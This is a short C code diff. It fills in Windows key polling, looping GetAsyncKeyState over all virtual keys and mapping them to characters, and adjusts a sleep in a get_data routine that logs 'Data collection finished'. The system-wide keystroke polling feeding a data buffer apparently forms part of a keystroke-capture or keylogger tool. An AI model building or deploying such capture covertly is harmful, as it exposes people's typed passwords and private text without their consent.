@@ -35,12 +35,19 @@ static bool is_any_key_pressed(char *key_pressed)
     }
 
 #ifdef _WIN32
-    // TODO: Implement Windows key polling
-    // Example: Use GetAsyncKeyState inside a loop or hook
-    // For now, this is a placeholder
+    for (int vKey = 8; vKey <= 254; ++vKey)
+    {
+        if (GetAsyncKeyState(vKey) & 0x8000)
+        {
+            UINT mapped = MapVirtualKeyA(vKey, MAPVK_VK_TO_CHAR);
 
-    // *key_pressed = ...;
-    // return true;
+            if (mapped > 0)
+            {
+                *key_pressed = (char)(mapped); // Virtual Key to ASCII
+                return true;
+            }
+        }
+    }
     return false;
 
 #else
@@ -120,7 +127,7 @@ void get_data(char *buffer, size_t max_size)
             }
         }
 
-        sleep_ms(50);
+        sleep_ms(75);
     }
 
     LOG("Data collection finished. Total size: %zu", current_size);
